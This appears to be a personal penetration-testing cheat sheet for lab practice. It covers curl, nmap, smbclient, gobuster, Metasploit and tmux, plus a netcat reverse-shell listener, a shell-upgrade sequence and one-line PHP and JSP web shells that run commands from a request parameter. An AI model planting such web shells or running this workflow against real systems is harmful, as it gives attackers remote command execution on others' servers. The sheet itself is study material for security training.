# HackTheWorld
### **CHEAT SHEET- https://devhints.io/curl**

## cURL is used for sending GET/POST requests to http/s

Curl can be used to get files or send data to servers using just command line and doing it fast. 

CURL 

-s silent most noise and make it easier to read

-v Verbose, easier to understand and shows almost everything included in request and connection

-i used to see request head and body

-I capitol i and used to see JUST header of request. 

-X sending a specific request such as POST or PUT, 

-d “DATA”; example with key for key.php ‘-d “key=UNENCRYPTED_KEY_HERE”

-L follows redirects page may give after login

-u username:pass used for logins with credentials if using login after url loads

## Structure of cURL

**basic connection**

$ curl http://<SERVER_IP>:<PORT>/ 

**if sending http authentication for logins with basic auth**

$ curl http://username:password@<SERVER_IP>:<PORT>/

**if sending with login using PHP logins after CONNECTION**

$ curl -X POST -u ‘username:admin&password:admin’ http://<SERVER_IP>:<PORT>/

## App/software/programs

- **SSH**
- **Netcat/ncat/nc**
    - Socat
    - Reverse shell capability using:
    - $ nc -lvnp 1234: listen for connection via only IP on port 1234
- **TMUX**
    - CTRL-B for prefix
        - SHIFT+”: splits up and down
        - SHIFT+%: splits to left or right
        - SHIFT+$: rename
        - Z: pause and unpause tmux
- **FTP**
- **SMB**(server message block)
    - SMB Client
        - necessary for attacks to open smb.
        - -N silences authentication if not needed and used to list shares
        - -L lists smb shares of available
        - $ smbclient -N -L \\\\<IP_ADDRESS>: used to list shares on smb port for a machine
- **NMAP**
    - -sC: makes nmap use scripts to obtain more information
    - -sV: makes nmap run a version scan.
    - -p-: makes nmap run all TCP ports
    - nmap --script <script name> -p<port> <host>: runs script in nmap
    - nmap -sV --script=banner <target>: grabs banner during scan of serviceversions.
    - SMD ENUMERATION: [SMD SCRIPT](https://nmap.org/nsedoc/scripts/smb-os-discovery.html)
- **GoBuster**
    - tool that allows for performing DNS, vhost, and directory brute-forcing
    - $ gobuster dir -u http://<IP_ADDRESS>/ -w /path/to/common/wordlist.txt
- **Metasploit**
    - $ msfconsole: starts metasploit
        - > search exploit <NAME>
        - > USE *copy path to exploit”
        - > show options: configures current exploit before deploy
        - > set <option> <value>: example for setting RHOSTS, the “victim” to ip 10.10.10.40
            - > set RHOSTS 10.10.10.40
        - > check: verifies if RHOST is actually vunerable to this attack.
        - > run | exploit
    - Searchsploit
- ExploitDB
- Github, [payloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/)
- Github, [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/peass-ng/PEASS-ng)
  
## Shell commands

$ python -c ‘import pty; pty.spawn(“/bin/bash”)’

upgrades shell connection to python/stty shell

CTRL+Z pause session in bash connection

input following stty command

$ stty raw -echo

$ fg

[enter]

## Resize STTY terminal

*in normal terminal:* $ echo $term

*in stty:* $ stty size

## Web Shell

`<?php system($_REQUEST["cmd"]); ?>`

opens web shell running php

same is JSP
`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
## LINKS

### Common Ports - [Wayback Machine](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf)

### VIM Cheat Sheet - [Watch Your Eyez](https://vimsheet.com/)

### HTTP STATUS CODES - [WIKIPEDIA WOOO](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)

### HackTricks - [Pretty Cool Site](https://book.hacktricks.wiki/en/index.html)
